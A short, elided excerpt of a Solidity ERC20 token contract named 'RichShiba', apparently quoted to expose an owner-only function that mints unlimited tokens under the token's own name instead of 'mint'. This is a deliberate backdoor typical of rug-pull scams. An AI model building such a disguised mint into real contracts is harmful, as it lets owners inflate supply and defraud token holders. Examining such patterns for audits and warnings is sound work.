...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function RichShiba(uint256 amount) public onlyOwner {
    RichShiba(msg.sender, amount);
    }
    ...
    function RichShiba(address account, uint256 amount) internal virtual {
...
contract RichShiba is ERC20 {

    uint tokenTotalSupply = 1000000000;

    constructor() public ERC20("RichShiba", "RICH") {
        RichShiba(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}